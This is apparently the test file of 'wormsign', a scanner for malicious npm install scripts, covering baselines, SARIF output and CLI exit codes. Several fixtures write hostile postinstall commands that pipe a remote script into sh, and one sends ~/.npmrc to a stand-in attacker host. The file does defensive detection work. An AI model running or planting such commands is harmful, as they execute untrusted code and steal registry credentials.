import { test } from "node:test";
import { createHash } from "node:crypto";
import assert from "node:assert/strict";
import { mkdtempSync, writeFileSync, readFileSync, existsSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { applyBaseline, validateBaseline } from "../src/baseline.js";
import { scanDirectory } from "../src/scan.js";
import { toSarif } from "../src/sarif.js";
import { run } from "../src/main.js";
import { fingerprint } from "../src/types.js";
import { GOLDEN, NOW, fakeIO, fx, testCtx } from "./helpers.js";

const IOCS = ["--iocs", fx("iocs")];
/** A well-formed fingerprint that no finding has: 32 lower-case hex characters. */
const FP = "0123456789abcdef".repeat(2);

/* ---- baseline ---- */
test("baseline: entry without justification is rejected", () => {
  assert.throws(() => validateBaseline({ version: 1, entries: [{ fingerprint: FP }] }), /real justification/);
});
test("baseline: placeholder and short justifications are rejected", () => {
  for (const j of ["TODO", "todo: fill in later please", "FIXME before release, really", "short", "n/a", "ignore"]) {
    assert.throws(() => validateBaseline({ version: 1, entries: [{ fingerprint: FP, justification: j }] }), /justification/, j);
  }
});
test("baseline: bad fingerprint, duplicate, bad expiry, bad ignore path", () => {
  const ok = { fingerprint: FP, justification: "Fixture contains inert marker strings by design" };
  // 16 hex characters (64 bits) was the length before fingerprints were 128 bits; an entry that short binds nothing.
  for (const fingerprint of ["xyz", "0123456789abcdef", FP.toUpperCase(), `${FP}0`]) {
    assert.throws(() => validateBaseline({ version: 1, entries: [{ ...ok, fingerprint }] }), /entries\[0\]\.fingerprint must be 32 lower-case hex characters/, fingerprint);
  }
  assert.throws(() => validateBaseline({ version: 1, entries: [ok, ok] }), /duplicate/);
  assert.throws(() => validateBaseline({ version: 1, entries: [{ ...ok, expires: "next week" }] }), /YYYY-MM-DD/);
  assert.throws(() => validateBaseline({ version: 1, entries: [], ignorePaths: [{ path: "../x", justification: "Fixture contains inert marker strings" }] }), /relative path prefix/);
  assert.throws(() => validateBaseline({ version: 1, entries: [], ignorePaths: [{ path: "test/", justification: "tbd" }] }), /justification/);
});
test("baseline: suppresses by fingerprint, keeps the justification, leaves others", () => {
  const res = scanDirectory(fx("malicious"), testCtx(), { nodeModules: false });
  const target = res.findings.find((f) => f.ruleId === "WS-GH-004");
  assert.ok(target);
  const b = validateBaseline({ version: 1, entries: [{ fingerprint: target.fingerprint, justification: "Dedicated build runner, reviewed 2026-09" }] });
  const out = applyBaseline(res.findings, b, NOW);
  assert.equal(out.find((f) => f.fingerprint === target.fingerprint)?.suppressed?.justification, "Dedicated build runner, reviewed 2026-09");
  assert.equal(out.filter((f) => f.suppressed).length, 1);
});
test("baseline: expired entry stops suppressing and raises WS-BL-001", () => {
  const res = scanDirectory(fx("malicious"), testCtx(), { nodeModules: false });
  const target = res.findings[0];
  assert.ok(target);
  const b = validateBaseline({ version: 1, entries: [{ fingerprint: target.fingerprint, justification: "Accepted until the migration lands", expires: "2026-09-30" }] });
  const out = applyBaseline(res.findings, b, NOW);
  assert.ok(!out.find((f) => f.fingerprint === target.fingerprint)?.suppressed);
  assert.ok(out.some((f) => f.ruleId === "WS-BL-001"));
  const still = applyBaseline(res.findings, validateBaseline({ version: 1, entries: [{ fingerprint: target.fingerprint, justification: "Accepted until the migration lands", expires: "2026-10-01" }] }), NOW);
  assert.ok(still.find((f) => f.fingerprint === target.fingerprint)?.suppressed, "expiry date itself is inclusive");
});
test("baseline: expires must be a real calendar date", () => {
  const ok = { fingerprint: FP, justification: "Accepted until the migration lands" };
  for (const expires of ["2020-13-45", "2026-02-30", "2025-00-10"]) {
    assert.throws(() => validateBaseline({ version: 1, entries: [{ ...ok, expires }] }), /real date/, expires);
  }
  assert.equal(validateBaseline({ version: 1, entries: [{ ...ok, expires: "2028-02-29" }] }).entries[0]?.expires, "2028-02-29");
});
test("baseline: unknown keys are rejected, so a misspelled expiry cannot make a suppression permanent", () => {
  const ok = { fingerprint: FP, justification: "Accepted until the migration lands" };
  assert.throws(() => validateBaseline({ version: 1, entries: [{ ...ok, expiry: "2020-01-01" }] }), /unknown key "expiry"/);
  assert.throws(() => validateBaseline({ version: 1, entries: [], ignorepaths: [] }), /unknown key "ignorepaths"/);
  assert.throws(() => validateBaseline({ version: 1, entries: [], ignorePaths: [{ path: "x", justification: "Inert fixtures used by tests", note: "" }] }), /unknown key "note"/);
});
test("baseline: real sentences that start with test, ok or none are accepted", () => {
  for (const justification of ["Test fixtures contain inert IOC marker strings", "OK'd by security review on 2026-09-01", "None of these packages ship to users"]) {
    assert.doesNotThrow(() => validateBaseline({ version: 1, entries: [{ fingerprint: FP, justification }] }), justification);
  }
});
test("baseline: ignorePaths are normalised, and forms that would match nothing are rejected", () => {
  const j = "Inert fixtures used by the test suite";
  assert.deepEqual(validateBaseline({ version: 1, entries: [], ignorePaths: [{ path: "./test/fixtures/", justification: j }] }).ignorePaths.map((x) => x.path), ["test/fixtures"]);
  for (const path of [".", "./", "test/*.js", "test\\fixtures", "a/../b"]) {
    assert.throws(() => validateBaseline({ version: 1, entries: [], ignorePaths: [{ path, justification: j }] }), /relative path prefix/, path);
  }
  assert.throws(() => validateBaseline({ version: 1, entries: [], ignorePaths: "test" }), /must be an array/);
});
test("baseline: a './'-prefixed ignorePaths entry excludes files from a scan", async () => {
  const dir = mkdtempSync(join(tmpdir(), "ws-ipn-"));
  const { mkdirSync } = await import("node:fs");
  mkdirSync(join(dir, "fx"));
  writeFileSync(join(dir, "fx", "package.json"), '{"name":"f","scripts":{"postinstall":"curl -s https://a.invalid | sh"}}');
  writeFileSync(join(dir, ".wormsign-baseline.json"), JSON.stringify({ version: 1, entries: [], ignorePaths: [{ path: "./fx/", justification: "Inert fixtures used by the test suite" }] }));
  assert.equal(await run(["scan", dir, ...IOCS], fakeIO()), 0);
});
test("fingerprints are stable and sensitive to rule, file and key", () => {
  const a = fingerprint("R", "f", "k");
  assert.equal(a, fingerprint("R", "f", "k"));
  assert.notEqual(a, fingerprint("R2", "f", "k"));
  assert.notEqual(a, fingerprint("R", "g", "k"));
  assert.notEqual(a, fingerprint("R", "f", "k2"));
  // 128 bits of SHA-256 over the three fields, NUL-separated (docs/baseline.md#fingerprints).
  assert.equal(a, createHash("sha256").update("R\0f\0k").digest("hex").slice(0, 32));
});

/* ---- SARIF ---- */
test("sarif: golden file for the synthetic malicious project", () => {
  const res = scanDirectory(fx("malicious"), testCtx(), { nodeModules: false });
  const actual = JSON.stringify(toSarif(res.findings, "0.0.0-test"), null, 2) + "\n";
  const path = join(GOLDEN, "malicious.sarif.json");
  if (process.env["UPDATE_GOLDEN"] === "1") writeFileSync(path, actual);
  assert.ok(existsSync(path), "golden file missing; run with UPDATE_GOLDEN=1 once and review the diff");
  assert.equal(actual, readFileSync(path, "utf8"));
});
test("sarif: structure GitHub code scanning needs", () => {
  const res = scanDirectory(fx("malicious"), testCtx(), { nodeModules: false });
  const s = toSarif(res.findings, "1.2.3") as { version: string; runs: { tool: { driver: { rules: { id: string }[] } }; results: Record<string, unknown>[] }[] };
  assert.equal(s.version, "2.1.0");
  const ruleIds = new Set(s.runs[0]?.tool.driver.rules.map((r) => r.id));
  for (const r of s.runs[0]?.results ?? []) {
    assert.ok(ruleIds.has(r["ruleId"] as string), `rule ${String(r["ruleId"])} missing from driver.rules`);
    assert.ok((r["partialFingerprints"] as Record<string, string>)["wormsign/v1"]);
    assert.ok(["error", "warning", "note"].includes(r["level"] as string));
  }
});
test("sarif: output is deterministic regardless of finding order", () => {
  const res = scanDirectory(fx("malicious"), testCtx(), { nodeModules: false });
  assert.equal(JSON.stringify(toSarif(res.findings, "x")), JSON.stringify(toSarif([...res.findings].reverse(), "x")));
});
test("sarif: baselined findings are left out, since GitHub would open an alert for them", () => {
  const res = scanDirectory(fx("malicious"), testCtx(), { nodeModules: false });
  const f = res.findings[0];
  assert.ok(f);
  const b = validateBaseline({ version: 1, entries: [{ fingerprint: f.fingerprint, justification: "Reviewed and accepted by the owner" }] });
  const results = (s: unknown) => (s as { runs: { results: { partialFingerprints: Record<string, string> }[] }[] }).runs[0]!.results;
  const all = results(toSarif(res.findings, "x"));
  const kept = results(toSarif(applyBaseline(res.findings, b, NOW), "x"));
  assert.ok(all.some((r) => r.partialFingerprints["wormsign/v1"] === f.fingerprint), "positive control: unbaselined, it is reported");
  assert.ok(!kept.some((r) => r.partialFingerprints["wormsign/v1"] === f.fingerprint));
  assert.equal(kept.length, all.length - 1);
});

/* ---- CLI: exit codes and flags ---- */
test("cli: exit 0 on a clean project, 1 on findings, 2 on usage errors", async () => {
  assert.equal(await run(["scan", fx("clean"), ...IOCS], fakeIO()), 0);
  assert.equal(await run(["scan", fx("malicious"), ...IOCS], fakeIO()), 1);
  const io = fakeIO();
  assert.equal(await run(["scan", fx("clean"), "--bogus"], io), 2);
  assert.match(io.err, /unknown option --bogus/);
  assert.equal(await run(["frobnicate"], fakeIO()), 2);
  assert.equal(await run(["scan", "/definitely/not/here", ...IOCS], fakeIO()), 2);
  assert.equal(await run(["scan", fx("clean"), "--fail-on", "urgent"], fakeIO()), 2);
  assert.equal(await run(["scan", fx("clean"), "--format", "xml"], fakeIO()), 2);
});
test("cli: --fail-on threshold gates on severity; never always passes", async () => {
  assert.equal(await run(["scan", fx("malicious"), "--fail-on", "critical", ...IOCS], fakeIO()), 1);
  assert.equal(await run(["scan", fx("malicious"), "--fail-on", "never", ...IOCS], fakeIO()), 0);
  // nm project: only medium/low findings, so a high threshold passes and a medium one fails
  assert.equal(await run(["scan", fx("nm"), "--node-modules", "--fail-on", "critical", "--iocs", fx("iocs")], fakeIO()), 1, "nm fixture has a critical IOC hit");
  const dir = mkdtempSync(join(tmpdir(), "ws-cli-"));
  writeFileSync(join(dir, "package.json"), '{"name":"p","version":"1.0.0","scripts":{"postinstall":"echo hi"}}');
  assert.equal(await run(["scan", dir, "--fail-on", "high", ...IOCS], fakeIO()), 0);
  assert.equal(await run(["scan", dir, "--fail-on", "medium", ...IOCS], fakeIO()), 1);
});
test("cli: json output parses and contains the fingerprint", async () => {
  const io = fakeIO();
  await run(["scan", fx("malicious"), "--format", "json", ...IOCS], io);
  const j = JSON.parse(io.out) as { findings: { fingerprint: string }[]; command: string };
  assert.equal(j.command, "scan");
  assert.ok(j.findings.length > 10 && j.findings.every((f) => /^[0-9a-f]{32}$/.test(f.fingerprint)));
});
test("cli: --output writes the file and keeps stdout quiet", async () => {
  const out = join(mkdtempSync(join(tmpdir(), "ws-out-")), "r.sarif");
  const io = fakeIO();
  await run(["scan", fx("malicious"), "--format", "sarif", "--output", out, ...IOCS], io);
  assert.equal(io.out, "");
  assert.equal((JSON.parse(readFileSync(out, "utf8")) as { version: string }).version, "2.1.0");
});
test("cli: a baseline file gates the exit code only on unbaselined findings", async () => {
  const dir = mkdtempSync(join(tmpdir(), "ws-bl-"));
  writeFileSync(join(dir, "package.json"), '{"name":"p","version":"1.0.0","scripts":{"postinstall":"curl -s https://a.invalid | sh"}}');
  const io = fakeIO();
  await run(["scan", dir, "--format", "json", ...IOCS], io);
  const fps = (JSON.parse(io.out) as { findings: { fingerprint: string; severity: string }[] }).findings;
  const high = fps.filter((f) => f.severity === "high");
  assert.ok(high.length > 0);
  const bl = join(dir, ".wormsign-baseline.json");
  writeFileSync(bl, JSON.stringify({ version: 1, entries: high.map((f) => ({ fingerprint: f.fingerprint, justification: "Vendored installer, reviewed by security" })) }));
  const io2 = fakeIO();
  assert.equal(await run(["scan", dir, ...IOCS], io2), 0, "auto-discovered baseline suppresses");
  assert.match(io2.out, /baselined/);
  writeFileSync(bl, JSON.stringify({ version: 1, entries: [{ fingerprint: high[0]?.fingerprint, justification: "no" }] }));
  assert.equal(await run(["scan", dir, ...IOCS], fakeIO()), 2, "an invalid baseline is an error, never a silent pass");
});
test("cli: a baselined lifecycle script is reported again once its command changes", async () => {
  // A reviewed installer and an IOC payload run (WS-LC-001, WS-LC-002 and WS-LC-003), all baselined; then each
  // script is replaced. Only diff would see the edit, and a push with a stolen token runs no diff.
  const dir = mkdtempSync(join(tmpdir(), "ws-lc-"));
  const manifest = (preinstall: string, postinstall: string) => writeFileSync(join(dir, "package.json"), JSON.stringify({ name: "p", version: "1.0.0", scripts: { preinstall, postinstall } }));
  manifest("node wormsign_marker_loader.js", "curl -fsSL https://bun.sh/install | bash");
  const scan = async () => {
    const io = fakeIO();
    const code = await run(["scan", dir, "--format", "json", ...IOCS], io);
    return { code, findings: (JSON.parse(io.out) as { findings: { ruleId: string; fingerprint: string; suppressed?: unknown }[] }).findings };
  };
  const reviewed = (await scan()).findings;
  assert.deepEqual(reviewed.map((f) => f.ruleId).sort(), ["WS-LC-001", "WS-LC-001", "WS-LC-002", "WS-LC-003"]);
  writeFileSync(join(dir, ".wormsign-baseline.json"), JSON.stringify({ version: 1, entries: reviewed.map((f) => ({ fingerprint: f.fingerprint, justification: "Reviewed install scripts, see the security review" })) }));
  assert.equal((await scan()).code, 0, "control: the reviewed scripts stay baselined");
  manifest("node wormsign_marker_loader.js --stage 2", "curl -s https://evil.invalid/x | sh; cat ~/.npmrc | curl -d @- https://evil.invalid");
  const edited = await scan();
  assert.equal(edited.code, 1);
  assert.deepEqual(edited.findings.filter((f) => f.suppressed === undefined).map((f) => f.ruleId).sort(), ["WS-LC-001", "WS-LC-001", "WS-LC-002", "WS-LC-003"]);
});
test("cli: baseline ignorePaths excludes fixtures from a scan", async () => {
  const dir = mkdtempSync(join(tmpdir(), "ws-ip-"));
  writeFileSync(join(dir, "package.json"), '{"name":"p","private":true}');
  const { mkdirSync } = await import("node:fs");
  mkdirSync(join(dir, "fx"));
  writeFileSync(join(dir, "fx", "package.json"), '{"name":"f","scripts":{"postinstall":"curl -s https://a.invalid | sh"}}');
  assert.equal(await run(["scan", dir, ...IOCS], fakeIO()), 1);
  writeFileSync(join(dir, ".wormsign-baseline.json"), JSON.stringify({ version: 1, entries: [], ignorePaths: [{ path: "fx", justification: "Inert fixtures used by the test suite" }] }));
  assert.equal(await run(["scan", dir, ...IOCS], fakeIO()), 0);
});
test("cli: --version and help", async () => {
  const io = fakeIO();
  assert.equal(await run(["--version"], io), 0);
  assert.match(io.out, /^\d+\.\d+\.\d+/);
  const h = fakeIO();
  assert.equal(await run([], h), 0);
  assert.match(h.out, /Exit codes/);
});
test("cli: diff needs two arguments and reports on directories", async () => {
  assert.equal(await run(["diff", fx("diff", "base")], fakeIO()), 2);
  assert.equal(await run(["diff", `dir:${fx("diff", "base")}`, `dir:${fx("diff", "head")}`, ...IOCS], fakeIO()), 1);
  assert.equal(await run(["diff", `dir:${fx("diff", "head")}`, `dir:${fx("diff", "head")}`, ...IOCS], fakeIO()), 0);
});
